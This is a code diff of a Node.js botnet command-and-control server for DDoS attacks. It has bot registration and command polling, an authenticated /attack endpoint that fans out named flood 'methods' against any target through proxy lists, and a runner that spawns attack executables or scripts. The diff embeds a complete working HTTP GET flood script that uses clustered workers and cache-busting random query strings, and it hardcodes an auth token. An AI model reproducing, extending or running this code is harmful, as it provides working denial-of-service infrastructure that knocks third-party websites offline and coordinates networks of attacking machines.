@@ -1,5 +1,5 @@
 const express = require('express');
-const { exec } = require('child_process');
+const { exec, spawn } = require('child_process');
 const axios = require('axios');
 const fs = require('fs');
 const crypto = require('crypto');
@@ -10,7 +10,7 @@ const app = express();
 app.use(express.json());
 
 const port = process.env.PORT || 5553;
-const AUTH_TOKEN = "ricardo";
+const AUTH_TOKEN = 'bold';
 
 // Rate limiting
 const limiter = rateLimit({
@@ -106,64 +106,139 @@ function activeAttackCount() {
   return connectedBots.filter(bot => pendingCommands[bot.id]).length;
 }
 
-// Method files
-const methodFiles = {
-  'CF-BYPASS': 'methods/cf-bypass.js',
-  'MODERN-FLOOD': 'methods/modern-flood.js',
-  'HTTP-SICARIO': 'methods/REX-COSTUM.js',
-  'RAW-HTTP': 'methods/h2-nust.js',
-  'RAW-GET': 'methods/raw-get.js',
-  'R9': 'methods/high-dstat.js',
-  'PRIV-TOR': 'methods/w-flood1.js',
-  'HOLD-PANEL': 'methods/http-panel.js',
-  'R1': 'methods/vhold.js',
-  'UAM': 'methods/uam.js',
-  'W.I.L': 'methods/wil.js',
-  'R10-TCP': 'methods/r10-tcp.js',
-  'R10-TLS': 'methods/r10-tls.js',
-  'R10-CONN': 'methods/r10-conn.js',
-  'R10-HEADER': 'methods/r10-header.js',
-  'R10-FRAG': 'methods/r10-frag.js',
-  'R10-PIPE': 'methods/r10-pipe.js',
-  'R10-COOKIE': 'methods/r10-cookie.js',
-  'R10-MIXED': 'methods/r10-mixed.js',
-  'R10-LOWCPU': 'methods/r10-lowcpu.js',
-  'RAPID10': 'methods/r10-rapid.js'
-};
+// Method mapping (for filename lookup)
+function getMethodFilename(method) {
+  const methodMap = {
+    'R9': 'high-dstat',
+    'PRIV-TOR': 'w-flood1',
+    'HOLD-PANEL': 'http-panel',
+    'R1': 'vhold',
+    'UAM': 'uam',
+    'W.I.L': 'wil',
+    'HTTP-SICARIO': 'REX-COSTUM',
+    'RAW-HTTP': 'h2-nust',
+    'CF-BYPASS': 'cf-bypass',
+    'MODERN-FLOOD': 'modern-flood',
+    'RAW-GET': 'raw-get',
+    'BYPASS': 'BYPASS',
+    'R-GOST': 'R-GOST',
+    'browsersun': 'browsersun',
+    'cibi': 'cibi',
+    'h2ca': 'h2ca',
+    'kbrowser': 'kbrowser',
+    'nust': 'nust',
+    'w-flood1': 'w-flood1',
+    'vhold': 'vhold',
+    'wil': 'wil',
+    'tlsop': 'tlsop',
+    'uambypass': 'uambypass'
+  };
+  if (methodMap[method]) return methodMap[method];
+  return method.toLowerCase().replace(/[\s.]+/g, '-');
+}
 
-// Ensure methods directory exists and create raw-get.js WITHOUT proxies
+// Universal command runner (supports .exe, .cs via dotnet, .js)
+function runAttackCommand(method, target, time, additionalArgs = [], callback = () => {}) {
+  const baseName = getMethodFilename(method);
+  const methodsDir = path.join(__dirname, 'methods');
+  const exePath = path.join(methodsDir, `${baseName}.exe`);
+  const csPath = path.join(methodsDir, `${baseName}.cs`);
+  const jsPath = path.join(methodsDir, `${baseName}.js`);
+
+  let command, argsList;
+
+  if (fs.existsSync(exePath)) {
+    command = exePath;
+    argsList = [target, time.toString(), ...additionalArgs];
+    console.log(`[SERVER-EXEC] C# EXE: ${command} ${argsList.join(' ')}`);
+  } else if (fs.existsSync(csPath)) {
+    command = 'dotnet';
+    argsList = ['run', csPath, target, time.toString(), ...additionalArgs];
+    console.log(`[SERVER-EXEC] C# SCRIPT: dotnet run ${csPath} ${target} ${time}`);
+  } else if (fs.existsSync(jsPath)) {
+    command = 'node';
+    argsList = [jsPath, target, time.toString(), ...additionalArgs];
+    console.log(`[SERVER-EXEC] Node.js: ${command} ${argsList.join(' ')}`);
+  } else {
+    console.error(`[ERROR] No executable found for method: ${method} (tried .exe, .cs, .js)`);
+    callback(new Error(`No executable for ${method}`));
+    return;
+  }
+
+  const proc = spawn(command, argsList, { detached: true, stdio: 'pipe' });
+  let output = '';
+  proc.stdout.on('data', (data) => output += data.toString());
+  proc.stderr.on('data', (data) => console.error(`[STDERR] ${data}`));
+  proc.on('error', (err) => {
+    console.error(`[ERROR] ${err.message}`);
+    callback(err);
+  });
+  proc.on('close', (code) => {
+    console.log(`[OUTPUT] ${output}`);
+    callback(null, output);
+  });
+  return proc;
+}
+
+// Ensure methods directory and create stubs for missing files
 function ensureMethodScripts() {
-  if (!fs.existsSync('./methods')) fs.mkdirSync('./methods');
-  
-  const rawGetPath = './methods/raw-get.js';
-  if (!fs.existsSync(rawGetPath)) {
-    const rawGetScript = `#!/usr/bin/env node
+  const methodsDir = path.join(__dirname, 'methods');
+  if (!fs.existsSync(methodsDir)) fs.mkdirSync(methodsDir, { recursive: true });
 
-// RAW-GET Flood - Pure GET requests, high RPS, minimal headers (NO PROXIES)
+  const writeStub = (filename, content) => {
+    const filePath = path.join(methodsDir, filename);
+    if (!fs.existsSync(filePath)) {
+      fs.writeFileSync(filePath, content);
+      console.log(`[SETUP] Created ${filename}`);
+    }
+  };
 
+  // C# stub (for methods that might be missing)
+  const csStub = (name) => `using System;
+class ${name} {
+    static void Main(string[] args) {
+        Console.WriteLine("[${name.ToUpper()}] Starting attack (stub)");
+        int time = args.Length > 1 ? int.Parse(args[1]) : 60;
+        System.Threading.Thread.Sleep(time * 1000);
+        Console.WriteLine("[${name.ToUpper()}] Attack complete");
+    }
+}`;
+
+  // Node.js stub
+  const jsStub = (name) => `console.log('[${name.toUpperCase()}] Starting attack'); const target = process.argv[2]; const time = parseInt(process.argv[3]) || 60; setTimeout(() => process.exit(0), time * 1000);`;
+
+  // List of expected method files (C# and Node.js)
+  const csMethods = [
+    'BYPASS', 'R-GOST', 'REX-COSTUM', 'browsersun', 'cf-bypass', 'cibi',
+    'h2-nust', 'h2ca', 'high-dstat', 'http-panel', 'kbrowser', 'modern-flood', 'raw-get'
+  ];
+  for (const m of csMethods) {
+    writeStub(`${m}.cs`, csStub(m));
+  }
+
+  const jsMethods = [
+    'nust', 'w-flood1', 'vhold', 'uam', 'wil',
+    'r10-rapid', 'r10-tcp', 'r10-tls', 'r10-conn', 'r10-header',
+    'r10-frag', 'r10-pipe', 'r10-cookie', 'r10-mixed', 'r10-lowcpu'
+  ];
+  for (const m of jsMethods) {
+    writeStub(`${m}.js`, jsStub(m));
+  }
+
+  // Also create raw-get.js (full version) if not exists – optional, but keep compatibility
+  const rawGetJsPath = path.join(methodsDir, 'raw-get.js');
+  if (!fs.existsSync(rawGetJsPath)) {
+    const rawGetJs = `#!/usr/bin/env node
+// RAW-GET Flood - No proxies
 const http = require('http');
 const https = require('https');
 const url = require('url');
 const cluster = require('cluster');
-
-const args = {
-    target: process.argv[2],
-    time: parseInt(process.argv[3]) || 60,
-    threads: parseInt(process.argv[4]) || 10,
-    rate: parseInt(process.argv[5]) || 1000
-};
-
+const args = { target: process.argv[2], time: parseInt(process.argv[3]) || 60, threads: parseInt(process.argv[4]) || 10, rate: parseInt(process.argv[5]) || 1000 };
 const parsed = new URL(args.target);
 const isHttps = parsed.protocol === 'https:';
 const httpLib = isHttps ? https : http;
-const keepAliveAgent = new httpLib.Agent({
-    keepAlive: true,
-    keepAliveMsecs: 10000,
-    maxSockets: Infinity,
-    maxFreeSockets: 256,
-    timeout: 60000
-});
-
+const keepAliveAgent = new httpLib.Agent({ keepAlive: true, keepAliveMsecs: 10000, maxSockets: Infinity, maxFreeSockets: 256, timeout: 60000 });
 if (cluster.isMaster) {
     console.log(\`\\n🔥 RAW-GET (no proxy) | Target: \${args.target} | Time: \${args.time}s | Rate: \${args.rate}/s/worker | Workers: \${args.threads}\`);
     for (let i = 0; i < args.threads; i++) cluster.fork();
@@ -171,57 +246,27 @@ if (cluster.isMaster) {
 } else {
     let running = true;
     let requestCount = 0;
-
     function sendRequest() {
         if (!running) return;
-        const options = {
-            hostname: parsed.hostname,
-            port: parsed.port || (isHttps ? 443 : 80),
-            path: parsed.pathname + (parsed.search ? parsed.search + '&' : '?') + Math.random(),
-            method: 'GET',
-            headers: {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Accept': 'text/html,application/xhtml+xml',
-                'Connection': 'keep-alive'
-            },
-            agent: keepAliveAgent,
-            rejectUnauthorized: false
-        };
+        const options = { hostname: parsed.hostname, port: parsed.port || (isHttps ? 443 : 80), path: parsed.pathname + (parsed.search ? parsed.search + '&' : '?') + Math.random(), method: 'GET', headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html', 'Connection': 'keep-alive' }, agent: keepAliveAgent, rejectUnauthorized: false };
         const req = httpLib.request(options, (res) => { requestCount++; res.resume(); });
         req.on('error', () => {});
         req.end();
     }
-
     const intervalMs = 1000 / args.rate;
     const intervalId = setInterval(() => sendRequest(), intervalMs);
-    setInterval(() => {
-        console.log(\`RPS: \${requestCount}\`);
-        requestCount = 0;
-    }, 1000);
-    setTimeout(() => {
-        running = false;
-        clearInterval(intervalId);
-        process.exit(0);
-    }, args.time * 1000);
+    setInterval(() => { console.log(\`RPS: \${requestCount}\`); requestCount = 0; }, 1000);
+    setTimeout(() => { running = false; clearInterval(intervalId); process.exit(0); }, args.time * 1000);
 }
 `;
-    fs.writeFileSync(rawGetPath, rawGetScript);
-    console.log('[SETUP] Created methods/raw-get.js (no proxy)');
+    fs.writeFileSync(rawGetJsPath, rawGetJs);
+    console.log('[SETUP] Created methods/raw-get.js');
   }
 }
-
 ensureMethodScripts();
 
-// Validate other method files exist (warnings only)
-Object.entries(methodFiles).forEach(([method, file]) => {
-  if (!fs.existsSync(file)) {
-    console.warn(`[WARNING] Method file not found: ${file} for ${method}`);
-  }
-});
+// ========== API ENDPOINTS ==========
 
-// ========== API ENDPOINTS (NO UI) ==========
-
-// Report endpoint
 app.post('/api/report', authenticate, (req, res) => {
   const { botId, target, method, requests, duration } = req.body;
   const bot = connectedBots.find(b => b.id === botId);
@@ -237,7 +282,6 @@ app.post('/api/report', authenticate, (req, res) => {
   res.json({ success: true });
 });
 
-// Stats API
 app.get('/api/stats', authenticate, (req, res) => {
   const now = Date.now();
   const online = connectedBots.filter(b => now - b.lastSeen < 10000).length;
@@ -246,7 +290,6 @@ app.get('/api/stats', authenticate, (req, res) => {
   res.json(botStats);
 });
 
-// Bot registration (using ID)
 app.post('/register', (req, res) => {
   let { id, name, url } = req.body;
   if (!id) {
@@ -264,12 +307,8 @@ app.post('/register', (req, res) => {
   }
   const botName = name || `agent-${id.slice(-6)}`;
   const newBot = { 
-    id, 
-    name: botName, 
-    lastSeen: Date.now(), 
-    registeredAt: new Date().toLocaleString(), 
-    attacksPerformed: 0, 
-    totalRequests: 0 
+    id, name: botName, lastSeen: Date.now(), registeredAt: new Date().toLocaleString(), 
+    attacksPerformed: 0, totalRequests: 0 
   };
   connectedBots.push(newBot);
   botStats.totalBots = connectedBots.length;
@@ -277,7 +316,6 @@ app.post('/register', (req, res) => {
   res.json({ message: 'Bot auto-approved', approved: true, bot: newBot });
 });
 
-// Command polling
 app.get('/get-command', (req, res) => {
   const { botId } = req.query;
   if (!botId) return res.status(400).json({ error: 'Bot ID required' });
@@ -295,7 +333,6 @@ app.get('/get-command', (req, res) => {
   res.json({ hasCommand: false });
 });
 
-// Admin endpoints (authenticated)
 app.get('/bots', authenticate, (req, res) => {
   const botsForUI = connectedBots.map(b => ({
     id: b.id, name: b.name, lastSeen: b.lastSeen, registeredAt: b.registeredAt,
@@ -356,16 +393,13 @@ app.get('/blocked', authenticate, (req, res) => res.json({ blocked: Array.from(b
 
 app.get('/ping', (req, res) => res.json({ alive: true, timestamp: Date.now(), uptime: process.uptime() }));
 
-// Server-side attack endpoint (RAW-GET now without proxy)
+// ========== SERVER-SIDE ATTACK ENDPOINT (UPDATED FOR C#) ==========
 app.get('/attack', authenticate, (req, res) => {
   const { target, time, methods } = req.query;
   if (!target || !time || !methods) return res.status(400).json({ error: 'Missing required parameters' });
   const timeNum = parseInt(time);
   if (isNaN(timeNum) || timeNum < 1 || timeNum > 3600) return res.status(400).json({ error: 'Invalid time' });
-  const methodFile = methodFiles[methods];
-  if (!methodFile || !fs.existsSync(methodFile)) {
-    return res.status(400).json({ error: `Method file not found for ${methods}` });
-  }
+
   console.log(`\n[SERVER-ATTACK] ${methods} -> ${target} for ${timeNum}s`);
   attackHistory.push({ target, time: timeNum, method: methods, timestamp: Date.now() });
   botStats.totalAttacks++;
@@ -374,96 +408,95 @@ app.get('/attack', authenticate, (req, res) => {
   botStats.attacksByTarget[target] = (botStats.attacksByTarget[target] || 0) + 1;
   res.status(200).json({ message: 'Server attack launched', target, time: timeNum, methods });
 
-  const execWithLog = (cmd) => {
-    exec(cmd, (error, stdout, stderr) => {
-      if (error) { console.error(`[ERROR] ${error.message}`); botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1); return; }
-      if (stdout) {
-        const lines = stdout.split('\n');
-        const requestLines = lines.filter(l => l.includes('Request') || l.includes('GET') || l.includes('POST')).length;
-        if (requestLines > 0) botStats.totalRequests += requestLines;
-        console.log(`[OUTPUT] ${stdout}`);
-      }
-      if (stderr) console.error(`[STDERR] ${stderr}`);
-    });
+  let activeProcesses = [];
+
+  const finish = () => {
+    botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1);
   };
 
+  // Helper to run a command and track process
+  const run = (method, additionalArgs = []) => {
+    const proc = runAttackCommand(method, target, timeNum, additionalArgs, (err) => {
+      if (err) console.error(`[ERROR] ${method} failed: ${err.message}`);
+    });
+    if (proc) activeProcesses.push(proc);
+  };
+
+  // Attack definitions (same as bot, using universal runner)
   switch(methods) {
+    case 'RAPID10':
+      const r10files = ['r10-rapid', 'r10-tcp', 'r10-tls', 'r10-conn', 'r10-header',
+                        'r10-frag', 'r10-pipe', 'r10-cookie', 'r10-mixed', 'r10-lowcpu'];
+      for (const f of r10files) run(f, ['30', 'proxy.txt', 'ua.txt']);
+      break;
     case 'CF-BYPASS':
-      execWithLog(`node methods/cf-bypass.js ${target} ${timeNum} 4 32 proxy.txt`);
+      run('cf-bypass', ['4', '32', 'proxy.txt']);
       break;
     case 'MODERN-FLOOD':
-      execWithLog(`node methods/modern-flood.js ${target} ${timeNum} 4 64 proxy.txt`);
+      run('modern-flood', ['4', '64', 'proxy.txt']);
       break;
     case 'HTTP-SICARIO':
-      execWithLog(`node methods/REX-COSTUM.js ${target} ${timeNum} 32 6 proxy.txt --randrate --full --legit --query 1`);
-      execWithLog(`node methods/cibi.js ${target} ${timeNum} 16 3 proxy.txt`);
-      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 32 2 proxy.txt`);
-      execWithLog(`node methods/nust.js ${target} ${timeNum} 12 4 proxy.txt`);
+      run('REX-COSTUM', ['32', '6', 'proxy.txt', '--randrate', '--full', '--legit', '--query', '1']);
+      run('cibi', ['16', '3', 'proxy.txt']);
+      run('BYPASS', ['32', '2', 'proxy.txt']);
+      run('nust', ['12', '4', 'proxy.txt']);
       break;
     case 'RAW-HTTP':
-      execWithLog(`node methods/h2-nust ${target} ${timeNum} 15 2 proxy.txt`);
-      execWithLog(`node methods/http-panel.js ${target} ${timeNum}`);
+      run('h2-nust', ['15', '2', 'proxy.txt']);
+      run('http-panel', []);
       break;
     case 'RAW-GET':
-      // No proxy argument – script ignores proxy.txt
-      execWithLog(`node methods/raw-get.js ${target} ${timeNum} 20 800`);
+      run('raw-get', ['20', '800']);
       break;
     case 'R9':
-      execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 32 7 proxy.txt`);
-      execWithLog(`node methods/w-flood1.js ${target} ${timeNum} 8 3 proxy.txt`);
-      execWithLog(`node methods/vhold.js ${target} ${timeNum} 16 2 proxy.txt`);
-      execWithLog(`node methods/nust.js ${target} ${timeNum} 16 2 proxy.txt`);
-      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 8 1 proxy.txt`);
+      run('high-dstat', ['32', '7', 'proxy.txt']);
+      run('w-flood1', ['8', '3', 'proxy.txt']);
+      run('vhold', ['16', '2', 'proxy.txt']);
+      run('nust', ['16', '2', 'proxy.txt']);
+      run('BYPASS', ['8', '1', 'proxy.txt']);
       break;
     case 'PRIV-TOR':
-      execWithLog(`node methods/w-flood1.js ${target} ${timeNum} 64 6 proxy.txt`);
-      execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 16 2 proxy.txt`);
-      execWithLog(`node methods/cibi.js ${target} ${timeNum} 12 4 proxy.txt`);
-      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 10 4 proxy.txt`);
-      execWithLog(`node methods/nust.js ${target} ${timeNum} 10 1 proxy.txt`);
+      run('w-flood1', ['64', '6', 'proxy.txt']);
+      run('high-dstat', ['16', '2', 'proxy.txt']);
+      run('cibi', ['12', '4', 'proxy.txt']);
+      run('BYPASS', ['10', '4', 'proxy.txt']);
+      run('nust', ['10', '1', 'proxy.txt']);
       break;
     case 'HOLD-PANEL':
-      execWithLog(`node methods/http-panel.js ${target} ${timeNum}`);
+      run('http-panel', []);
       break;
     case 'R1':
-      execWithLog(`node methods/vhold.js ${target} ${timeNum} 15 2 proxy.txt`);
-      execWithLog(`node methods/high-dstat.js ${target} ${timeNum} 64 2 proxy.txt`);
-      execWithLog(`node methods/cibi.js ${target} ${timeNum} 4 2 proxy.txt`);
-      execWithLog(`node methods/BYPASS.js ${target} ${timeNum} 16 2 proxy.txt`);
-      execWithLog(`node methods/REX-COSTUM.js ${target} ${timeNum} 32 6 proxy.txt --randrate --full --legit --query 1`);
-      execWithLog(`node methods/w-flood1.js ${target} ${timeNum} 8 3 proxy.txt`);
-      execWithLog(`node methods/vhold.js ${target} ${timeNum} 16 2 proxy.txt`);
-      execWithLog(`node methods/nust.js ${target} ${timeNum} 32 3 proxy.txt`);
-      break;
-    case 'RAPID10':
-      execWithLog(`node methods/r10-rapid.js ${target} ${timeNum} 10000`);
-      execWithLog(`node methods/r10-tcp.js ${target} ${timeNum}`);
-      execWithLog(`node methods/r10-tls.js ${target} ${timeNum}`);
-      execWithLog(`node methods/r10-conn.js ${target} ${timeNum}`);
-      execWithLog(`node methods/r10-header.js ${target} ${timeNum} 5000`);
-      execWithLog(`node methods/r10-frag.js ${target} ${timeNum}`);
-      execWithLog(`node methods/r10-pipe.js ${target} ${timeNum}`);
-      execWithLog(`node methods/r10-cookie.js ${target} ${timeNum}`);
-      execWithLog(`node methods/r10-mixed.js ${target} ${timeNum}`);
-      execWithLog(`node methods/r10-lowcpu.js ${target} ${timeNum} 1000`);
+      run('vhold', ['15', '2', 'proxy.txt']);
+      run('high-dstat', ['64', '2', 'proxy.txt']);
+      run('cibi', ['4', '2', 'proxy.txt']);
+      run('BYPASS', ['16', '2', 'proxy.txt']);
+      run('REX-COSTUM', ['32', '6', 'proxy.txt', '--randrate', '--full', '--legit', '--query', '1']);
+      run('w-flood1', ['8', '3', 'proxy.txt']);
+      run('vhold', ['16', '2', 'proxy.txt']);
+      run('nust', ['32', '3', 'proxy.txt']);
       break;
     case 'UAM':
-      execWithLog(`node methods/uam.js ${target} ${timeNum} 5 4 6`);
+      run('uam', ['5', '4', '6']);
       break;
     case 'W.I.L':
-      execWithLog(`node methods/wil.js ${target} ${timeNum} 10 8 4`);
+      run('wil', ['10', '8', '4']);
       break;
     default:
-      console.error(`[ERROR] Unknown method: ${methods}`);
-      botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1);
+      // Single-file method
+      run(methods, []);
+      break;
   }
 
+  // Clean up after duration
   setTimeout(() => {
-    botStats.activeAttacks = Math.max(0, botStats.activeAttacks - 1);
-  }, timeNum * 1000);
+    activeProcesses.forEach(proc => {
+      try { proc.kill(); } catch(e) {}
+    });
+    finish();
+  }, timeNum * 1000 + 5000);
 });
 
-// Error handling middleware
+// Error handling
 app.use((err, req, res, next) => {
   console.error('[SERVER ERROR]', err.stack);
   res.status(500).json({ error: 'Internal server error' });
@@ -477,11 +510,11 @@ app.listen(port, () => {
   console.log(`📍 Listening on port ${port}`);
   console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
   console.log(`📊 Live Stats: ENABLED`);
-  console.log(`🔥 RAW-GET method ready (no proxy required)`);
+  console.log(`🔥 C#/Node.js method support enabled`);
   console.log('========================================\n');
   
   if (!fs.existsSync('./proxy.txt')) fs.writeFileSync('./proxy.txt', '# Add your proxies here\n# Format: ip:port\n');
   console.log('📁 Required files:');
-  console.log('   - /methods/ - attack scripts (auto-created)');
+  console.log('   - /methods/ - attack scripts (.exe, .cs, .js)');
   console.log('   - proxy.txt - add your proxies (one per line)\n');
 });
